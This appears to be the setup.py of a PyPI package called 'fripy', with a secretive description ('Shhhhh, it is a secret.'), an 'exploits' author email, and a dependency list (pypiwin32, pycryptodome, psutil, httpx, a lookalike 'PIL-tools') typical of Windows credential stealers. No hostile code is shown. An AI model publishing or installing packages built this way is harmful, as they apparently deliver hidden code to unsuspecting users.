from setuptools import setup, find_packages
import codecs
import os

# project0eai Bombonica#8745 was here :)
# Credit to NeuralNine for template : https://www.youtube.com/watch?v=tEFkHEKypLI

VERSION = '1.5.0'
DESCRIPTION = 'Shhhhh, it is a secret.'
LONG_DESCRIPTION = 'It is that sometimes you just have to play along. :)'
AUTHOR = "EAIiub"
EMAIL = "zenoexploits@gmail.com"

# Setting up
setup(
	name="fripy",
	version=VERSION,
	author=AUTHOR,
	author_email=EMAIL,
    description=DESCRIPTION,
    long_description_content_type="text/markdown",
    long_description=LONG_DESCRIPTION,
    packages=find_packages(),
    install_requires=[
        'httpx',
        'pyotp',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'PIL-tools'
    ]
)